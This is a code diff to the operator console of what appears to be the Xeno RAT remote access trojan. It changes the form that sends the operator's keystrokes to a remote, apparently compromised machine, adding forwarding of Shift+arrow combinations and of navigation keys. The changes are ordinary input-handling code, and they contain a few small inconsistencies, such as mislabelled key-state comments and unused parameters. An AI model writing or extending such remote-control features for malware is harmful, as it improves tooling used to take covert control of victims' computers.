@@ -678,6 +678,11 @@ namespace xeno_rat_server.Forms
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked)
                 return;
 
+            Keys actualKey = e.KeyData & Keys.KeyCode;
+
+            bool shiftDown = e.Shift;
+            bool ctrlDown = e.Control;
+
             // --- Handle Ctrl combos ---
             if (e.Control)
             {
@@ -705,7 +710,6 @@ namespace xeno_rat_server.Forms
             if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9))
             {
                 bool capsLockOn = Control.IsKeyLocked(Keys.CapsLock);
-                bool shiftDown = e.Shift;
 
                 Keys keyToSend = e.KeyCode;
 
@@ -723,18 +727,11 @@ namespace xeno_rat_server.Forms
                 return;
             }
 
-            // --- Handle other keys like Enter, Space ---
-            switch (e.KeyCode)
+            if (shiftDown && (actualKey == Keys.Up || actualKey == Keys.Down || actualKey == Keys.Left || actualKey == Keys.Right))
             {
-                case Keys.Space:
-                case Keys.Enter:
-                case Keys.Back:
-                case Keys.Tab:
-                case Keys.Escape:
-                    _ = SendKeyAsync(e.KeyCode); // fire-and-forget
-                    e.Handled = true;
-                    break;
-                    // add more special keys here if needed
+                _ = SendShiftedArrowKeyAsync(actualKey);
+                e.Handled = true;
+                return;
             }
         }
 
@@ -744,6 +741,21 @@ namespace xeno_rat_server.Forms
                 return true; // treat Tab as a regular input key
             return base.IsInputKey(keyData);
         }
+
+        private async Task SendShiftedArrowKeyAsync(Keys arrowKey)
+        {
+            try
+            {
+                // Press Shift
+                await SendKeyStateShiftedArrowKeysAsync(arrowKey, 1); // KEY_DOWN       
+                await SendKeyStateShiftedArrowKeysAsync(arrowKey, 0); // KEY_DOWN
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"SendKeyAsync error: {ex.Message}");
+            }
+        }
+
 
         private async Task SendKeyAsync(Keys key)
         {
@@ -795,12 +807,35 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(data);
         }
 
-        private async Task SendKeyStateAsync(Keys key, int state)
+        private async Task SendKeyStateAsync(Keys key, int state, bool extended = false)
         {
+            int keyValue = (int)key;
+
+            if (extended)
+                keyValue |= 0x01000000; // mark extended key
+
             await client.SendAsync(client.sock.Concat(
                 new byte[] { 14 },
-                client.sock.IntToBytes(((int)key) | (state << 16))
+                client.sock.IntToBytes(keyValue | (state << 16))
             ));
+        }
+
+        private async Task SendKeyStateShiftedArrowKeysAsync(Keys key, int state, bool extended = false)
+        {
+            int keyValue = (int)key;
+
+            byte[] shiftBytes = client.sock.IntToBytes((int)Keys.ShiftKey | (state << 16));
+            byte[] arrowBytes = client.sock.IntToBytes((int)key | (state << 16));
+
+            // Packet header for type 15 (custom combo)
+            byte[] header = new byte[] { 15 };
+
+            // Combine all arrays
+            byte[] packet = client.sock.Concat(header, shiftBytes);
+            packet = client.sock.Concat(packet, arrowBytes);
+
+            // Send packet
+            await client.SendAsync(packet);
         }
 
 
@@ -853,7 +888,10 @@ namespace xeno_rat_server.Forms
                 return base.ProcessCmdKey(ref msg, keyData);
 
             // Intercept Tab key
-            if (keyData == Keys.Tab || keyData == Keys.Enter || keyData == Keys.Escape || keyData == Keys.LWin || keyData == Keys.RWin || keyData == Keys.Escape)
+            if (keyData == Keys.Space || keyData == Keys.Tab || keyData == Keys.Enter || keyData == Keys.Escape || keyData == Keys.LWin || keyData == Keys.RWin || keyData == Keys.Escape
+                || keyData == Keys.Up || keyData == Keys.Down || keyData == Keys.Left || keyData == Keys.Right
+                || keyData == Keys.Insert || keyData == Keys.Delete || keyData == Keys.Home || keyData == Keys.End
+                || keyData == Keys.PageUp || keyData == Keys.PageDown)
             {
                 _ = SendKeyAsync(keyData);
                 return true;
